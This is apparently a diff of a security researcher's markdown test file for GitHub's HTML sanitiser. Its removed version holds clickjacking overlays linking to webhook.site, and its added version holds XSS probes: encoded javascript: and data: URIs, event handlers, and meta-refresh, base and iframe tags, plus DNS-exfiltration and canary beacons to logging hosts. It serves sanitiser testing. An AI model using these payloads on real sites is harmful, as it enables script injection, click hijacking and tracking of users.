@@ -1,179 +1,162 @@
-# Security Research - v34
+# Security Research - v35
 
-## GitHub Markdown HTML Attribute Testing
+## Deep Nesting & Edge Case Testing
 
-Testing various HTML elements and attributes for potential UI/clickjacking vulnerabilities.
-
----
-
-### 1) Table Border Size Variations
-
-Testing if table border validation has been fixed:
-
-<a href="https://webhook.site/a13fd38a-8fdd-46d9-a8cd-c1f5f3285027/clicked-table-1">
-<table border="999999">
-<tr><td>Click test 1</td></tr>
-</table>
-</a>
-
-<a href="https://webhook.site/a13fd38a-8fdd-46d9-a8cd-c1f5f3285027/clicked-table-2">
-<table border="9999999999">
-<tr><td>Click test 2</td></tr>
-</table>
-</a>
+Testing nested elements, Unicode attributes, and other edge cases.
 
 ---
 
-### 2) KBD with Extreme Sizes
+### 1) Deep KBD Nesting (10 levels)
 
-<a href="https://webhook.site/a13fd38a-8fdd-46d9-a8cd-c1f5f3285027/kbd-click">
-<kbd>
-<table border="1000000" align="center"></table>
-</kbd>
-</a>
+<kbd><kbd><kbd><kbd><kbd><kbd><kbd><kbd><kbd><kbd>
+Deeply nested content - does this break anything?
+</kbd></kbd></kbd></kbd></kbd></kbd></kbd></kbd></kbd></kbd>
 
 ---
 
-### 3) Ruby Annotation Overflow
+### 2) Deep DIV Nesting (15 levels)
 
-<a href="https://webhook.site/a13fd38a-8fdd-46d9-a8cd-c1f5f3285027/ruby-click">
-<ruby>Normal Text<rt style="font-size:9999px">HUGE ANNOTATION</rt></ruby>
-</a>
-
-<ruby>Version 2.0<rt>                                                                                                                   Hidden content padding test</rt></ruby>
+<div><div><div><div><div><div><div><div><div><div><div><div><div><div><div>
+Very deeply nested div content
+</div></div></div></div></div></div></div></div></div></div></div></div></div></div></div>
 
 ---
 
-### 4) Mark Element with Large Font
+### 3) Mixed Deep Nesting
 
-<a href="https://webhook.site/a13fd38a-8fdd-46d9-a8cd-c1f5f3285027/mark-click">
-<mark style="font-size:9999px;position:absolute">HUGE MARK</mark>
-</a>
-
----
-
-### 5) Details/Summary Click Capture
-
-<details>
-<summary>Click to expand</summary>
-<a href="https://webhook.site/a13fd38a-8fdd-46d9-a8cd-c1f5f3285027/details-click">
-Hidden link inside details
-</a>
-</details>
+<div><kbd><table><tr><td><div><kbd><table><tr><td>
+Mixed nesting
+</td></tr></table></kbd></div></td></tr></table></kbd></div>
 
 ---
 
-### 6) Nested Divs with Align
+### 4) Unicode in ID Attribute
 
-<div align="center">
-<div align="left">
-<div align="right">
-<a href="https://webhook.site/a13fd38a-8fdd-46d9-a8cd-c1f5f3285027/nested-div-click">
-<table border="50000" cellpadding="99999" cellspacing="99999">
-<tr><td>Nested test</td></tr>
-</table>
-</a>
-</div>
-</div>
-</div>
+<h4 id="❤️🔥✨">Unicode Emoji ID</h4>
+
+[Link to emoji ID](#❤️🔥✨)
+
+<h4 id="<script>">Script in ID</h4>
+
+[Link to script ID](#<script>)
 
 ---
 
-### 7) Image Width Percentage Abuse
+### 5) Very Long ID
 
-<a href="https://webhook.site/a13fd38a-8fdd-46d9-a8cd-c1f5f3285027/img-click">
-<img src="https://webhook.site/a13fd38a-8fdd-46d9-a8cd-c1f5f3285027/img-load.gif" width="9999%" height="9999%">
-</a>
+<h4 id="aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa">Very Long ID Test</h4>
 
 ---
 
-### 8) SUP/SUB with Position
+### 6) HTML Entities in Links
 
-<a href="https://webhook.site/a13fd38a-8fdd-46d9-a8cd-c1f5f3285027/sup-click">
-<sup style="position:fixed;top:0;left:0;width:100%;height:100%;z-index:9999">Overlay</sup>
-</a>
+<a href="javascript&#58;alert(1)">JS Entity Test 1</a>
 
----
+<a href="&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;">JS Entity Test 2</a>
 
-### 9) HR with Width Abuse
-
-<a href="https://webhook.site/a13fd38a-8fdd-46d9-a8cd-c1f5f3285027/hr-click">
-<hr width="999999" size="999999">
-</a>
+<a href="data&#58;text/html,<script>alert(1)</script>">Data Entity Test</a>
 
 ---
 
-### 10) Definition List Overflow
+### 7) Multiple Images Same URL
 
-<a href="https://webhook.site/a13fd38a-8fdd-46d9-a8cd-c1f5f3285027/dl-click">
-<dl>
-<dt style="width:9999px;height:9999px">Term</dt>
-<dd>Definition with massive term above</dd>
-</dl>
-</a>
-
----
-
-### 11) Pre with Massive Content
-
-<a href="https://webhook.site/a13fd38a-8fdd-46d9-a8cd-c1f5f3285027/pre-click">
-<pre style="width:9999px;white-space:nowrap">
-This is very long content that might overflow the container and create clickable areas outside normal bounds...............................................................................................................................
-</pre>
-</a>
+![img1](https://webhook.site/503e9388-e477-46a6-8a58-3a627c4fdb86/multi-1.gif)
+![img2](https://webhook.site/503e9388-e477-46a6-8a58-3a627c4fdb86/multi-1.gif)
+![img3](https://webhook.site/503e9388-e477-46a6-8a58-3a627c4fdb86/multi-1.gif)
+![img4](https://webhook.site/503e9388-e477-46a6-8a58-3a627c4fdb86/multi-1.gif)
+![img5](https://webhook.site/503e9388-e477-46a6-8a58-3a627c4fdb86/multi-1.gif)
 
 ---
 
-### 12) Samp Element Test
+### 8) Object/Embed Tags (should be stripped)
 
-<a href="https://webhook.site/a13fd38a-8fdd-46d9-a8cd-c1f5f3285027/samp-click">
-<samp style="display:block;width:9999px;height:9999px">Sample output with huge dimensions</samp>
-</a>
+<object data="https://webhook.site/503e9388-e477-46a6-8a58-3a627c4fdb86/object.swf"></object>
 
----
-
-### 13) INS (Inserted) Element
-
-<a href="https://webhook.site/a13fd38a-8fdd-46d9-a8cd-c1f5f3285027/ins-click">
-<ins style="display:block;position:absolute;width:100vw;height:100vh">Inserted content overlay</ins>
-</a>
+<embed src="https://webhook.site/503e9388-e477-46a6-8a58-3a627c4fdb86/embed.swf">
 
 ---
 
-### 14) Table Cellpadding/Cellspacing Abuse
+### 9) SVG Tag (should be stripped)
 
-<a href="https://webhook.site/a13fd38a-8fdd-46d9-a8cd-c1f5f3285027/cellpad-click">
-<table cellpadding="99999999" cellspacing="99999999">
-<tr><td>Content</td></tr>
-</table>
-</a>
+<svg onload="alert(1)">
+  <image href="https://webhook.site/503e9388-e477-46a6-8a58-3a627c4fdb86/svg-image.gif"></image>
+</svg>
 
 ---
 
-### 15) Combined KBD + Table Attack
+### 10) Video/Audio Tags (should be stripped)
 
-<a href="https://webhook.site/a13fd38a-8fdd-46d9-a8cd-c1f5f3285027/combo-click">
-<kbd>
-<table border="17111111" align="right"></table>
-</kbd>
-<kbd>
-<table border="17111111" align="left"></table>
-</kbd>
-<kbd>
-<table border="17111111" align="center"></table>
-</kbd>
-</a>
+<video src="https://webhook.site/503e9388-e477-46a6-8a58-3a627c4fdb86/video.mp4"></video>
+
+<audio src="https://webhook.site/503e9388-e477-46a6-8a58-3a627c4fdb86/audio.mp3"></audio>
+
+---
+
+### 11) Form Elements (should be stripped)
+
+<form action="https://webhook.site/503e9388-e477-46a6-8a58-3a627c4fdb86/form">
+<input type="text" name="test">
+<button type="submit">Submit</button>
+</form>
+
+---
+
+### 12) Meta/Link Tags (should be stripped)
+
+<meta http-equiv="refresh" content="0;url=https://webhook.site/503e9388-e477-46a6-8a58-3a627c4fdb86/meta-refresh">
+
+<link rel="stylesheet" href="https://webhook.site/503e9388-e477-46a6-8a58-3a627c4fdb86/style.css">
+
+---
+
+### 13) Base Tag (should be stripped)
+
+<base href="https://webhook.site/503e9388-e477-46a6-8a58-3a627c4fdb86/">
+
+---
+
+### 14) IFrame (should be stripped)
+
+<iframe src="https://webhook.site/503e9388-e477-46a6-8a58-3a627c4fdb86/iframe.html"></iframe>
+
+---
+
+### 15) Event Handlers (should be stripped)
+
+<div onclick="alert(1)">Click me onclick</div>
+
+<img src="x" onerror="alert(1)">
+
+<body onload="alert(1)">
+
+<svg/onload="alert(1)">
+
+<input onfocus="alert(1)" autofocus>
+
+---
+
+### 16) Markdown Image with Event Handler
+
+![test](https://webhook.site/503e9388-e477-46a6-8a58-3a627c4fdb86/md-img.gif "onerror=alert(1)")
+
+---
+
+### 17) Link with Data URI
+
+[Data URI Link](data:text/html,<script>alert(1)</script>)
+
+[Data Image](data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7)
 
 ---
 
 ### DNS Exfil
 
-![dns](https://v34-dns.a13fd38a-8fdd-46d9-a8cd-c1f5f3285027.dnshook.site/dns.gif)
+![dns](https://v35-dns.503e9388-e477-46a6-8a58-3a627c4fdb86.dnshook.site/dns.gif)
 
 ### Canary
 
-![canary](https://webhook.site/a13fd38a-8fdd-46d9-a8cd-c1f5f3285027/v34-canary.gif)
+![canary](https://webhook.site/503e9388-e477-46a6-8a58-3a627c4fdb86/v35-canary.gif)
 
 ---
 
-*v34 - GitHub Markdown HTML attribute testing*
+*v35 - Deep nesting & edge case testing*
